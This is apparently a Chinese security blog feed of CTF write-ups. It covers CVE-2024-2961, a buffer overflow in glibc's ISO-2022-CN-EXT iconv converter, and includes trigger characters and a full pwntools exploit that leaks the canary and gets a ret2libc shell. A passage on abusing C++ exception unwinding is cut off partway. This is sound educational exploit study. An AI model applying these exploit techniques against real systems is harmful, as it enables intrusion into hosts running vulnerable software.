<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符 |		溢出内容		|		原UTF-8表示</span><br><span class="line">劄  		$*H [24 2A 48]      	  \xe5\x8a\x84</span><br><span class="line">䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a</span><br><span class="line">峛  		$*H [24 2A 48]			  \xe5\xb3\x9b</span><br></pre></td></tr></table></figure></div>

<h4 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h4><p>先贴一张2.27libc中的漏洞点关键代码，具体可在pathToYourLibc&#x2F;iconvdata&#x2F;iso-2022-cn-ext.c中查看</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ESC	0x1b</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line">...........................................................</span><br><span class="line"><span class="comment">/* See whether we have to emit an escape sequence.  */</span>		      </span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">set</span> != used)						      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    <span class="comment">/* First see whether we announced that we use this		      </span></span><br><span class="line"><span class="comment">	       character set.  */</span>					      </span><br><span class="line">	    <span class="keyword">if</span> ((used &amp; SO_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; <span class="number">8</span>))	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">									      </span><br><span class="line">		assert (used &gt;= <span class="number">1</span> &amp;&amp; used &lt;= <span class="number">4</span>);			      </span><br><span class="line">		escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;			      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SO_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS2_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert (used == CNS11643_2_set); <span class="comment">/* XXX */</span>		      </span><br><span class="line">		escseq = <span class="string">&quot;*H&quot;</span>;						      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS3_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert ((used &gt;&gt; <span class="number">5</span>) &gt;= <span class="number">3</span> &amp;&amp; (used &gt;&gt; <span class="number">5</span>) &lt;= <span class="number">7</span>);		      </span><br><span class="line">		escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;		      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="keyword">if</span> (used == CNS11643_2_set)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS2_0;					      </span><br><span class="line">		*outptr++ = SS2_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (used &gt;= CNS11643_3_set &amp;&amp; used &lt;= CNS11643_7_set)	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS3_0;					      </span><br><span class="line">		*outptr++ = SS3_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span>							      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="comment">/* We only have to emit something if currently ASCII is	      </span></span><br><span class="line"><span class="comment">		   selected.  Otherwise we are switching within the	      </span></span><br><span class="line"><span class="comment">		   SO charset.  */</span>					      </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">set</span> == ASCII_set)					      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    <span class="keyword">if</span> (outptr + <span class="number">1</span> &gt; outend)				      </span><br><span class="line">		      &#123;							      </span><br><span class="line">			result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">			<span class="keyword">break</span>;						      </span><br><span class="line">		      &#125;							      </span><br><span class="line">		    *outptr++ = SO;					      </span><br><span class="line">		  &#125;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="comment">/* Always test the length here since we have used up all the      </span></span><br><span class="line"><span class="comment">	       guaranteed output buffer slots.  */</span>			      </span><br><span class="line">	    <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">		<span class="keyword">break</span>;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	  &#125;								      </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">	    <span class="keyword">break</span>;							      </span><br><span class="line">	  &#125;								      </span><br><span class="line">									      </span><br><span class="line">	*outptr++ = buf[<span class="number">0</span>];						      </span><br><span class="line">	*outptr++ = buf[<span class="number">1</span>];						      </span><br><span class="line">	<span class="built_in">set</span> = used;							      </span><br><span class="line">      &#125;									      </span><br><span class="line">									      </span><br><span class="line">    <span class="comment">/* Now that we wrote the output increment the input pointer.  */</span>	      </span><br><span class="line">    inptr += <span class="number">4</span>;								      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>其中比较重要的是知道各种mask是掩码，与目标进行按位与操作时可以提取出掩码对应位的值，也就是提取出特征信息</p>
<p><strong>used</strong>是当前正在处理的字符所属字符集的标识</p>
<p><strong>set</strong>是当前的字符集标识</p>
<p><strong>ann</strong>(annouce)是一个变量，用于记录已声明的字符集。</p>
<p><strong>outptr</strong> 是指向当前输出缓冲区位置的指针。</p>
<p><strong>outend</strong> 是指向输出缓冲区末尾（或可用空间的结束）的指针。</p>
<p><strong>inptr</strong> 是指向当前输入缓冲区位置的指针</p>
<h5 id="三种不同的字符集"><a href="#三种不同的字符集" class="headerlink" title="三种不同的字符集"></a>三种不同的字符集</h5><p>在字符编码转换中，SO（Shift Out）、SS2（Single Shift 2）和SS3（Single Shift 3）是用于指示不同字符集的特殊控制字符或转义序列。它们在处理多字节字符集（如ISO-2022）时尤其重要。以下是它们的区别和作用：</p>
<h6 id="SO-Shift-Out"><a href="#SO-Shift-Out" class="headerlink" title="SO (Shift Out)"></a>SO (Shift Out)</h6><ul>
<li><strong>用途</strong>: SO（Shift Out）是一个控制字符，用于从单字节字符集切换到多字节字符集。</li>
<li><strong>控制字符</strong>: 通常表示为0x0E。</li>
<li><strong>作用</strong>: 在ISO-2022编码中，SO字符表示后续的字节将使用特定的多字节字符集，直到遇到SI（Shift In）字符为止。SO和SI字符用于在ASCII和其他字符集之间切换。</li>
</ul>
<h6 id="SS2-Single-Shift-2"><a href="#SS2-Single-Shift-2" class="headerlink" title="SS2 (Single Shift 2)"></a>SS2 (Single Shift 2)</h6><ul>
<li><strong>用途</strong>: SS2（Single Shift 2）是一个转义序列，用于临时从主字符集切换到第二辅助字符集，仅影响紧随其后的一个字符。</li>
<li><strong>控制字符</strong>: 通常表示为0x8E。</li>
<li><strong>作用</strong>: 在处理多字节字符时，SS2指示紧随其后的一个字节应被解释为第二辅助字符集中的字符。使用SS2字符可以在不改变当前字符集的情况下使用不同的字符集中的字符。</li>
</ul>
<h6 id="SS3-Single-Shift-3"><a href="#SS3-Single-Shift-3" class="headerlink" title="SS3 (Single Shift 3)"></a>SS3 (Single Shift 3)</h6><ul>
<li><strong>用途</strong>: SS3（Single Shift 3）是一个转义序列，用于临时从主字符集切换到第三辅助字符集，仅影响紧随其后的一个字符。</li>
<li><strong>控制字符</strong>: 通常表示为0x8F。</li>
<li><strong>作用</strong>: 类似于SS2，SS3指示紧随其后的一个字节应被解释为第三辅助字符集中的字符。它允许在不改变当前字符集的情况下使用第三辅助字符集中的字符。</li>
</ul>
<p>具体不同字符集所属的类别可见源码中的枚举，mask掩码上方的字符集都是该类型的字符集</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    	ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="实际运行中的-used-及其对应分支"><a href="#实际运行中的-used-及其对应分支" class="headerlink" title="实际运行中的 used 及其对应分支"></a>实际运行中的 used 及其对应分支</h5><p>以UTF-8转义到ISO-2022-CN-EXT为例</p>
<p>具体哪一个 <code>used</code> 的值被设置，取决于UTF-8输入字符在ISO-2022-CN-EXT字符集中的对应字符集。例如：</p>
<ul>
<li>如果输入字符是GB2312字符集中的字符，<code>used</code> 将被设置为 <code>GB2312_set</code>（值为1）。</li>
<li>如果输入字符是CNS11643-2字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_2_set</code>（值为24）。</li>
<li>如果输入字符是CNS11643-3字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_3_set</code>（值为96）。</li>
</ul>
<p>假设当前输入字符在GB2312字符集中，<code>used</code> 将被设置为 <code>GB2312_set</code>（1），并进入第一个 <code>if</code> 分支，发出对应的转义序列。类似地，对于其他字符集，<code>used</code> 将被设置为相应的值，并进入对应的 <code>if</code> 分支。</p>
<h5 id="具体执行过程"><a href="#具体执行过程" class="headerlink" title="具体执行过程"></a>具体执行过程</h5><p><strong>1. 检查是否需要发出转义序列</strong>：首先检查当前使用的字符集（<code>set</code>）是否与目标字符集（<code>used</code>）不同。如果不同，则需要发出转义序列。</p>
<p><strong>2. 判断是否已经声明使用该字符集</strong>：</p>
<p>我们现在详细分析下3个if分支的条件</p>
<p><code>if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))</code>	</p>
<ul>
<li><p>used &amp; SO_mask 在目标字符集类型为SO时不为0</p>
</li>
<li><p>(ann &amp; SO_ann) !&#x3D; (used &lt;&lt; 8)用于检测是否声明过该字符集</p>
</li>
<li><p>如果目标字符集是<code>SO</code>类型且未声明，则生成相应的转义序列。</p>
</li>
</ul>
<p><code>else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))</code></p>
<ul>
<li>如果目标字符集是<code>SS2</code>类型且未声明，则生成相应的转义序列。</li>
</ul>
<p><code>else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))</code></p>
<ul>
<li>如果目标字符集是<code>SS3</code>类型且未声明，则生成相应的转义序列。</li>
</ul>
<p>实际我们发现只有在SO的分支里有一段边界检测的代码</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">&#123;							      </span><br><span class="line">	result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">	<span class="keyword">break</span>;						     </span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure></div>



<p>那么我们要利用漏洞，首先就要输入一个SS2字符集或SS3字符集的字符。</p>
<p><strong>3.生成转义序列</strong>：</p>
<ul>
<li>根据<code>used</code>字符集的类型，选择相应的转义序列，并写入输出缓冲区<code>outptr</code>。&lt;—关键漏洞点</li>
<li>更新已声明的字符集<code>ann</code>。</li>
</ul>
<p><code>escseq</code> 是一个指向字符数组的指针，用于存储转义序列（escape sequence）。这些转义序列用于在输出数据中标识字符集的切换或特定字符的编码方式。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *escseq;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SO 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS2 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;*H&quot;</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS3 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p><strong>4.为特定字符集生成额外的字节</strong>：</p>
<ul>
<li>如果<code>used</code>是<code>CNS11643_2_set</code>，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC(即0x1b)与0x4e的后缀。</li>
<li>如果<code>used</code>在<code>CNS11643_3_set</code>到<code>CNS11643_7_set</code>之间，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC与0x4f的后缀。</li>
</ul>
<p><strong>5.切换到ASCII字符集时发出SO字节</strong>：如果当前字符集是ASCII需要切换，且<strong>outptr + 1 &lt;&#x3D; outend</strong>，则加入0x0e后缀。</p>
<p><strong>6.检查输出缓冲区长度</strong>：确保在写入新的字节前输出缓冲区<code>outptr</code>有足够的空间，否则返回<code>__GCONV_FULL_OUTPUT</code>错误。</p>
<p><strong>7.改变当前字符集（若与目标字符集不同）</strong>：<code>set = used;</code></p>
<p><strong>8.自增输入指针</strong>：处理完一个字符后，增加输入指针<code>inptr</code>。</p>
<h4 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h4><h5 id="XGCTF-echo"><a href="#XGCTF-echo" class="headerlink" title="XGCTF [echo]"></a>XGCTF [echo]</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185742098.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185755294.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185806653.png"
                      class=""
                >

<p>64位程序开了canary保护，最后有个明显的往s里读0x60字节的栈溢出，那么我们就要想办法先得到canary的值。我们发现canary实际存在var_8处，而最后iconv函数实际对输入进行换编码后会存0x26字节到s中，s与canary之间只差0x28个字节，那么我们利用iconv的漏洞，先填充0x25个垃圾字符，最后写一个会触发漏洞的字符，就可以溢出3字节刚好把canary低位的\x00给覆盖了，那么printf(“%s”,s)就能直接把canary的值打印出来了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185814773.png"
                      class=""
                >

<p>之后有了canary，又能栈溢出，直接ret2libc即可</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./echo&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28257</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x25</span> + <span class="string">&quot;劄&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\x48&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi_ret = <span class="number">0x401493</span></span><br><span class="line">ret_add = <span class="number">0x40101a</span></span><br><span class="line">main_add = <span class="number">0x401256</span></span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_add)) </span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_add = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_add = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;collectcrop&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(ret_add) + p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Exploits under exception handling</title>
    <url>/blog/2024/09/21/Exploits-under-exception-handling/</url>
    <content><![CDATA[<h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>在栈溢出漏洞中，程序没有控制或错误控制输入的大小导致了该漏洞的产生。那我们很自然会想到能不能用<code>try</code>  <code>throw</code> <code>catch</code>的异常机制来捕获栈溢出行为，从而能更直观的获取错误信息，也在一定程度上避免了一些奇怪的错误产生。但在c++的异常处理实现中，如果我们放任输入数据超过缓冲区大小，冀以异常机制来捕获栈溢出，结果将不尽如人意，甚至还会导致canary保护机制的绕过。</p>
<h4 id="原理-题目分析"><a href="#原理-题目分析" class="headerlink" title="原理&amp;题目分析"></a>原理&amp;题目分析</h4><p>这里借助题目对其原理进行理解，其中加入了个人的一些推测和理解，有问题处希望师傅们批评指正。</p>
<h5 id="2024-羊城杯-logger"><a href="#2024-羊城杯-logger" class="headerlink" title="[2024 羊城杯]logger"></a>[2024 羊城杯]logger</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170437604.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170505641.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170518829.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170528338.png"
                      class=""
                >

<p>这里我一开始参考 <a class="link"   href="https://www.bilibili.com/video/BV1eE421L7ZE/"  title="" target="">DASCTF X GFCTF 2024四月-pwn-control【异常机制】<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>这个视频，想要覆盖掉rbp打栈迁移，实际从throw触发异常到catch捕获的主逻辑在<code>__cxa_throw</code>的<code>_Unwind_RaiseException</code>函数里，其中 <code>_Unwind_RaiseException</code> 是用于栈展开（stack unwinding）的关键函数之一，其主要功能如下：</p>
<ul>
<li>这个函数负责执行栈展开，即遍历当前调用栈上的各个栈帧，寻找匹配的 <code>catch</code> 块。</li>
<li>栈展开过程中，函数会逐帧回溯，并在每个栈帧上调用编译器生成的处理函数来检查是否存在与异常类型匹配的 <code>catch</code> 块。</li>
<li>如果找到匹配的 <code>catch</code> 块，栈展开停止，控制权转移到该块。</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170552763.png"
                      class=""
                >

<p>从这个函数跳转出来后，会进入<code>0x4019a1</code>这里执行，我们对照IDA中的内容会发现这里实质上是<code>cleanup</code>这个子函数，该函数的主要功能如下：</p>
<ul>
<li><p>在栈展开的过程中，每个栈帧可能包含需要执行的清理操作（如调用析构函数）。</p>
</li>
<li><p>如果 <code>_Unwind_RaiseException</code> 确定某个栈帧不包含匹配的 <code>catch</code> 块，但需要进行清理操作，会调用与该栈帧关联的清理函数。这个清理函数通常会执行栈帧中需要的析构函数或者其他资源释放操作。</p>
</li>
<li><p>IDA 中识别为 <code>cleanup()</code> 的函数，就是这些清理操作的函数，它用于处理抛出异常过程中需要释放的资源。</p>
</li>
</ul>
<p>这个vuln函数的命名是因为我一开始以为这个莫名其妙的无作为的函数是解题的关键，但通过以上的理解，其实这个函数更有可能是执行清理的具体函数，但由于该栈帧中没有需要清理的内容，所以显示为空。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170608549.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170616808.png"
                      class=""
                >

<p>然后会调用<code>__Unwind_Resume</code>，这个函数是 C++ 异常处理机制中的一个重要函数，它用于在栈展开过程中恢复异常处理的流程，通常在执行完清理操作后继续展开栈帧。在该函数的末尾，我们发现我们的rbp实际已经被赋值为了想要的值。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170639538.png"
                      class=""
                >

<p>但该题目与视频中的那道题最大的不同是，在将rbp控制后，没有机会进行leave;ret了，主函数是一个死循环，退出循环的方式是选项3直接调用exit退出。那么我们就没有机会打栈迁移了。</p>
<p>那么我们需要利用新的方法，这时我参考了<a class="link"   href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html"  title="" target="">羊城杯 2024 pwn writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>这篇wp中给的解法，发现程序中有很多地方另有玄机。其实程序中还有很多try,catch的组合，在没有被调用的函数中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170659736.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170739062.png"
                      class=""
                >

<p>什么？程序中居然有catch段中存在对system函数的调用！后面我们通过调试其实可以发现上面打印的错误信息的参数存在src中，正常会打印出Buffer Overflow这个信息，而且0x4040a0也会做为system的参数。更巧的是，一直被我们忘在一边的trace函数中边界处理不当，当i&#x3D;8时，实际可以往src处写入0x10个字节。那么我们就可以把&#x2F;bin&#x2F;sh写入src中，然后想办法把程序控制流转向这个catch块。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170749201.png"
                      class=""
                >

